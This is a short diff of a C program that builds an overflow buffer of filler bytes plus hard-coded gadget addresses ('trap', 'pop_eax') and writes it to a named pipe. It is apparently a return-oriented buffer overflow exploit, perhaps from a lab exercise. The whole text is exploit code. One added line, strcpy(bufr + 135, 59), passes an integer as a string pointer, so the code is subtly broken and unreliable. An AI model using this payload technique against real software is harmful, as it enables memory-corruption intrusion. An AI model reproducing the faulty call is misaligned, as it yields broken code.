@@ -7,15 +7,16 @@
 
 int main(void)
 {
-  char bufr[140];
+  char bufr[138];
   char trap[] = "\xe5\xb6\xa9\xbb";
-  char pop_eax[] = "\xe1\xa0\xb9\xbb\x3b\x00\x00\x00";
+  char pop_eax[] = "\xe1\xa0\xb9\xbb";
   int i;
+  // Fill up buffer
   for(i = 0; i < 131; i++)
-    memcpy(bufr + i, "\x90",1);
+    memcpy(bufr + i, "\x01",1);
   
   strcpy(bufr + 131, pop_eax);
-  //strcpy(bufr + 136, "");
+  strcpy(bufr + 135, 59);
   writecmd(PIPEPATH, bufr);
   
   return 0;
